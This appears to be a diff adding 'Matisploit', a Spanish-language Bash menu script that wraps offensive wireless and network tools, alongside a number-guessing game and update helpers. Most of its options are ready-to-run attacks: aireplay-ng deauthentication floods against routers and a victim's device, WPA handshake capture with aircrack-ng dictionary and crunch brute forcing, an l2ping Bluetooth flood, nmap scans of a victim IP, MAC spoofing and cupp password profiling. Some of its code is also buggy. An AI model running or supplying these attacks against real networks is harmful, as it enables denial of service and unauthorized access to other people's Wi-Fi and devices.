@@ -1,0 +1,556 @@
+#!/bin/bash
+source mtsconfig.sh
+
+##############################################################FUNCIONES#########################################################################
+function activar_monitor() {
+echo "########MONITOR##########"
+echo -e "$yellow SEGURO? $nc"
+read -p " mts ▷▷▷ " s15
+if [ $s15 == y ]
+then
+sudo airmon-ng check kill
+sudo airmon-ng start $interfaz
+
+sleep 1 
+mts
+else
+mts
+fi
+}
+################################################
+function desactivar_monitor() {
+echo -e "$yellow SEGURO? $nc"
+read -p " mts ▷▷▷ "  s15
+if [ $s15 == y ]
+then
+sudo airmon-ng stop $monitor
+sudo service NetworkManager start
+sleep 1
+mts
+else
+mts
+fi
+}
+##############################################
+function limpiar_aircrack() {
+echo "Especifique directorio a limpiar"
+read -p " mts ▷▷▷ "  cleann
+echo "Borrando archivos y saliendo.."
+cd $cleann
+sudo rm *.csv
+sudo rm *.cap
+sudo rm *.netxml
+}
+##############################################
+function actualizar_sistema() {
+echo -e " $green UPDATING..####################################################################################### $nc "
+sudo apt-get update -y
+echo -e " $green UPGRADING..###################################################################################### $nc "
+sudo apt-get upgrade -y
+echo -e " $green DIST-UPDATING..################################################################################## ############################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################$nc "
+sudo apt-get dist-upgrade -y
+}
+
+##############################################
+function desautenticar() {
+sudo airmon-ng check kill
+sudo  airmon-ng start $interfaz
+
+airodump-ng $monitor
+echo "Desautenticar a :"
+echo " 1] Desautentición total"
+echo " 2] Cliente"
+read deaut
+
+if [ $deaut == 1 ]
+then
+echo "Especifique BSSID del router"
+read -p " mts ▷▷▷ "  macrd
+aireplay-ng --deauth 500000 -a $macrd -h aa:aa:aa:aa:aa:aa $monitor
+fi
+if [ $deaut == 2 ]
+then
+echo "Especifique MAC de la víctima"
+read -p " mts ▷▷▷ "  dvictim
+echo "Especifique BSSID del router"
+read -p " mts ▷▷▷ "  macr2
+aireplay-ng --deauth 500000 -a $macr2 -c $dvictim  $monitor
+fi
+}
+##############################################################
+
+##############################################
+function crack_wifi() {
+sudo airmon-ng check kill
+sudo airmon-ng start $interfaz
+
+sudo airodump-ng $monitor #Se escanean los Ap de alrededor
+$editor_de_texto $userr/datos.txt
+echo "Ingrese el canal"
+read canal
+echo "Ingrese la MAC"
+read macr
+sudo airodump-ng -c $canal --bssid $macr $monitor #Se ven los dispositivos conectados al ap
+echo -e "$red Ingrese ESSID para capturar handshake y haga un ataque de desautenticación $nc "
+read essid
+gnome-terminal --tab
+sudo airodump-ng -c $canal --bssid $macr $monitor -w $essid #Se deja en este modo , a espera de capturar el handshake
+}
+
+##############################################
+function cambiar_mac() {
+echo "Dispositivo a cambiar ( eth0 , $interfaz)"
+read -p " mts ▷▷▷ "  dispositivo
+if [ $dispositivo == '' ]
+then
+$dispositivo=$interfaz
+echo "$dispositivo"
+sleep 2
+fi
+echo " 1)RESET MAC"
+echo " 2)NUEVA MAC"
+read -p " mts ▷▷▷ "  macelection
+if [ $macelection == 1 ]
+then 
+sudo ifconfig $dispositivo down
+sudo macchanger --permanent $dispositivo
+sudo ifconfig $dispositivo up
+fi
+if [ $macelection == 2 ]
+then 
+echo " 1)Random"
+echo " 2)Personalizada"
+read -p " mts ▷▷▷ "  custommac
+if [ $custommac == 1 ]
+then
+sudo ifconfig $dispositivo down
+sudo macchanger -r $dispositivo
+sudo ifconfig $dispositivo up
+fi
+if [ $custommac == 2 ]
+then 
+echo "Qué MAC desea"
+read -p " mts ▷▷▷ "  macwrite
+sudo ifconfig $dispositivo down
+sudo macchanger -m $macwrite $dispositivo
+sudo ifconfig $dispositivo up
+fi
+fi
+}
+###################################################################################################################################
+function crear_app() {
+echo "
+[Desktop Entry]
+Name=<Nombre de tu app>
+Encoding=UTF-8
+Exec=sh -c <Programa a ejecutar en shell>
+Icon=<nombre de tu imagen .png>
+StartupNotify=false
+Terminal=true
+Type=Application
+Categories=05-password-attacks;05-05-profile;
+X-Kali-Package=crunch
+
+" >> /usr/share/applications/$file_desktop.desktop
+gedit /usr/share/applications/$file_desktop.desktop
+}
+##################################################################################################################################
+function ataques_wifi(){
+echo -e "	$blue 1] Ataque de fuerza bruta con diccionario a wifi	$nc"
+echo -e "	$blue 2] Ataque DoS a cliente/s				$nc"
+echo -e "	$blue 3] Crunch on the go				$nc"
+echo -e "	$red 4] Ver dispositivos conectados a la red		$nc"
+echo -e "	$red 5] Escanear puertos abiertos			$nc"
+echo -e "	$red 6] Descubrir sistema operativo			$nc"
+read -p "	 mts ▷▷▷ "  s12
+case $s12 in 
+	1)
+
+crack_wifi
+echo "Especifique archivo.cap"
+read capfile
+echo "Ahora especifique la ubicacion del diccionario[/root/Descargas/rockyou.txt ]"
+read pathbf
+sudo aircrack-ng -w $pathbf $capfile #Se crackea el archivo.cap
+echo "Desea limpiar los archivos? [y/n]"
+read -p " mts ▷▷▷ "  clear
+if [ $clear == y ]
+then
+limpiar_aircrack
+fi
+		
+;; 
+	2) 
+
+desautenticar
+;;
+	3)  
+crack_wifi
+echo "ESSID:"
+read -p " mts ▷▷▷ "  essidcrunch
+ crunch 10 10 9876543210 | aircrack-ng  $userr/$essidcrunch-01.cap -e $essidcrunch -w- 
+echo "Desea limpiar los archivos? [y/n]"
+read -p " mts ▷▷▷ "  clear
+if [ $clear == y ]
+then
+limpiar_aircrack
+fi
+;;
+	4)
+
+echo "Especifique direccion ip del router(ifconfig > $interfaz > inet)"
+sh -c "ifconfig"
+read -p " mts ▷▷▷ "  rip
+sudo nmap -sP $rip/24
+;;
+	5)
+echo "Especifique direccion ip de la víctima"
+read -p " mts ▷▷▷ "  ipnmap
+sudo nmap -sS -O -sV -v $ipnmap      
+;;
+	6)
+echo "Especifique dirección del pc"
+read -p " mts ▷▷▷ "  victimip
+sudo nmap -p 445 --script smb-os-discovery $victimip
+;;
+	*)
+echo -e "$red Entrada invalida: Seleccione un número del 1 al 6 $nc"
+sleep 1
+mts
+;;
+esac
+}
+########################################################################################
+function run() {
+sudo l2ping -i hci0 -s 600 -f $macblue
+}
+function btattack() {
+echo -e "$blue MAC Víctima : $nc "
+read macbt
+export macblue=$macbt
+run
+
+}
+###################################################################################################################################################	
+###################################################################################################################################################	
+
+function adivinar() {
+
+echo -e "$yellow Estoy pensando un numero del 1 al $numero_a_adivinar $nc "
+echo -e "$yellow Intenta Adivinar!!!!!!!!!!!!! $nc"
+read -p " mts ▷▷▷ "  adivina
+if [ $adivina -lt $numero ] #si la variable adivina es menor (less than)
+then
+echo -e "$Cyan Mi numero es mayor $nc"
+adivinar
+elif [ $numero -lt $adivina ]
+then
+echo -e " $red Mi numero es menor $nc"
+adivinar
+elif [ $adivina -eq $numero  ]
+then 
+echo -e " $blue   
+  ▄█    █▄       ▄████████    ▄████████         ▄██████▄     ▄████████ ███▄▄▄▄      ▄████████ ████████▄   ▄██████▄  
+  ███    ███     ███    ███   ███    ███        ███    ███   ███    ███ ███▀▀▀██▄   ███    ███ ███   ▀███ ███    ███ 
+  ███    ███     ███    ███   ███    █▀         ███    █▀    ███    ███ ███   ███   ███    ███ ███    ███ ███    ███ 
+ ▄███▄▄▄▄███▄▄   ███    ███   ███              ▄███          ███    ███ ███   ███   ███    ███ ███    ███ ███    ███ 
+▀▀███▀▀▀▀███▀  ▀███████████ ▀███████████      ▀▀███ ████▄  ▀███████████ ███   ███ ▀███████████ ███    ███ ███    ███ 
+  ███    ███     ███    ███          ███        ███    ███   ███    ███ ███   ███   ███    ███ ███    ███ ███    ███ 
+  ███    ███     ███    ███    ▄█    ███        ███    ███   ███    ███ ███   ███   ███    ███ ███   ▄███ ███    ███ 
+  ███    █▀      ███    █▀   ▄████████▀         ████████▀    ███    █▀   ▀█   █▀    ███    █▀  ████████▀   ▀██████▀  
+                                                                                                                     
+
+  $nc"
+sleep 2
+
+
+
+echo "Deseas jugar de nuevo? [ y / n ]"
+read -p " mts ▷▷▷ "  playagain
+if [ $playagain == y ]
+then
+adivinar_r
+else 
+mts
+fi
+else
+echo -e "$green ERROR, no tipeaste un numero $nc"
+sleep 2
+adivinar
+fi
+}
+function adivinar_r() {
+numero=`echo $(($RANDOM%$numero_a_adivinar))`
+adivinar
+}
+
+
+###################################################################################################################################################	
+###################################################################################################################################################	
+function helpp() {
+echo "Uso : mts <arg1> "
+
+echo "	Comandos Disponibles:"
+
+echo " -a	3	--update	Actualiza todo el sistema , (update,upgrade,dist-upgrade) "
+echo " -b				Aplicaciones de Fuerza Bruta como : ....."
+echo " -c	9	--config	Abre el configurador de mts"
+echo " -ch		--chmac		Cambia la Mac de la interfaz seleccionada"
+echo " -d		--del		Borra los archivos de aircrack"
+echo " -e	10	--edit		Edita Matispoit"
+echo " -h		--help		Muestra esta ayuda"
+echo " -p		--play		Juega a 'Adivina el núnero'"
+echo " -w	1	--wireless	Muestra el Menú de ataque wifi"
+
+echo "Ejemplo: mts 3 "
+echo "Esto Actualiza el sistema"
+}
+
+###################################################################################################################################################	
+###################################################################################################################################################	
+###################################################################################################################################################	
+
+case $1 in 	
+	-a)
+actualizar_sistema
+;;
+
+
+	-b)
+btattack
+;;
+	-bb)
+run
+;;
+	-c)
+sudo $editor_de_texto /usr/local/bin/mtsconfig.sh
+;;
+	-ch)
+desautenticar
+;;
+	-d)
+limpiar_aircrack
+;;
+	-e)
+sudo $editor_de_texto /usr/local/bin/matisploit
+;;
+	-p)
+adivinar_r
+;;
+	-w)
+ataques_wifi
+;;
+
+	--update)
+actualizar_sistema
+;;
+	--config)
+sudo $editor_de_texto /usr/local/bin/mtsconfig.sh
+;;
+	--chmac)
+cambiar_mac
+;;
+	--del)
+limpiar_aircrack
+;;
+	
+	--edit)
+sudo $editor_de_texto /usr/local/bin/matisploit
+;;	
+	--play)
+adivinar_r
+;;
+	--wireless)
+ataques_wifi
+;;
+	--dmon) #disable mon0
+desactivar_monitor
+;;
+	--amon) #activate mon0
+activar_monitor
+;;
+	1)
+ataques_wifi
+;;
+	3)
+actualizar_sistema
+;;
+	9)
+sudo $editor_de_texto /usr/local/bin/mtsconfig.sh
+;;
+	10)
+sudo $editor_de_texto /usr/local/bin/matisploit
+;;
+
+	-h)
+helpp
+;;
+	--help)
+	echo "Uso : mts (arg1) arg(2) "
+###################################################################################################################################################	
+echo "	Comandos Disponibles:"
+
+echo " -a	--update	Actualiza todo el sistema , (update,upgrade,dist-upgrade) "
+echo " -b			Aplicaciones de Fuerza Bruta como : ....."
+echo " -c	..config	Abre el configurador de mts"
+echo " -ch	--chmac		Cambia la Mac de la interfaz seleccionada"
+echo " -d	--del		Borra los archivos de aircrack"
+echo " -e	--edit		Edita Matispoit"
+echo " -h	--help		Muestra esta ayuda"
+echo " -p	--play		Juega a 'Adivina el núnero'"
+echo " -w	--wireless	Muestra el Menú de ataque wifi"
+;;
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+##############################################################################################################################################	
+	"")
+cd $userr
+clear
+
+echo -e "              $green                             
+   ███╗   ███╗ █████╗ ████████╗██╗███████╗██████╗ ██╗      ██████╗ ██╗████████╗ 
+   ████╗ ████║██╔══██╗╚══██╔══╝██║██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝ 
+   ██╔████╔██║███████║   ██║   ██║███████╗██████╔╝██║     ██║   ██║██║   ██║    
+   ██║╚██╔╝██║██╔══██║   ██║   ██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║    
+   ██║ ╚═╝ ██║██║  ██║   ██║   ██║███████║██║     ███████╗╚██████╔╝██║   ██║    
+   ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝    
+                                                                                
+   ____________________________________________________________________________ $nc"
+
+
+echo "					"										
+echo "Bienvenido a Matisploit $namee "
+echo -e "$green SELECCIONE UNA OPCION $nc"
+echo "Tipee 'helpp' para ayuda"
+
+echo -e "$green  ▷▷▷ 1] Ataques wifi				$nc"
+echo -e "$grey  ▷▷▷ 2] Fuerza bruta / phishing		$nc"
+echo -e "$yellow  ▷▷▷ 3] Actualizar sistema			$nc"
+echo -e "$green  ▷▷▷ 4] Activar modo monitor			$nc"
+echo -e "$red  ▷▷▷ 5] Desactivar modo monitor		$nc"
+echo -e "$Purple  ▷▷▷ 6] Cambiar MAC				$nc"
+echo -e "$Cyan  ▷▷▷ 7] Borrar residuos de aircrack		$nc"
+echo -e "$Cafe  ▷▷▷ 8] 'Juega a Elige un número'		$nc"
+echo -e "$Fiuscha  ▷▷▷ 9] Configurar mts			$nc"
+echo -e "$Fiuscha  ▷▷▷ 10] Editar mts			$nc" 
+echo -e "$blue  ▷▷▷ 11] Aplicaciones	$nc"	
+################################################
+read -p " mts ▷▷▷ " s1 
+################################################
+case $s1 in
+	1)
+ataques_wifi
+
+;;
+################################################
+	2) 
+cupp -i
+
+;;
+################################################
+	3)
+
+actualizar_sistema
+;;
+################################################
+	4)
+
+activar_monitor
+;;
+################################################
+	5)
+
+desactivar_monitor
+;;
+################################################
+	6)
+cambiar_mac
+
+;;
+###############################################
+	7)
+limpiar_aircrack
+;;
+################################################
+	8)	
+
+adivinar_r
+
+################################################
+;;
+	9)
+sudo $editor_de_texto /usr/local/bin/mtsconfig.sh
+;;
+################################################
+	
+	10)
+sudo $editor_de_texto /usr/local/bin/matisploit
+;;
+	11)
+echo " 1] Crear Aplicación"
+echo " 2] Desinstalar un programa"
+echo -e "$red 3] Eliminar usuario $nc"
+read -p " mts ▷▷▷ " s11
+case $s11 in
+	1)
+read -p "Nombre del archivo .desktop : " file_desktop
+read -p "Ruta hacia ícono de imagen (24x24) : " path_to_image
+case $path_to_image in
+	"")
+crear_app
+
+;;	
+	*)
+cp $path_to_image /usr/share/icons/hicolor/24x24/apps
+crear_app
+;;
+esac
+;;
+	2)
+echo "Introduzca el nombre del programa a desinstalar"
+read -p " mts ▷▷▷ " programa_a_desinstalar
+sudo apt-get purge --auto-remove $programa_a_desinstalar
+;;
+
+	*) 
+echo -e "$red Entrada invalida: Seleccione un número del 1 al 2 $nc"
+sleep 1
+mts
+;;
+#####
+esac
+;;
+###########################################
+	helpp)
+helpp
+;;
+	*) 
+echo -e "$red Entrada invalida: Seleccione un número del 1 al 11 $nc"
+sleep 1
+mts
+;;
+	
+esac
+
+
+
+;;
+
+esac
+
+
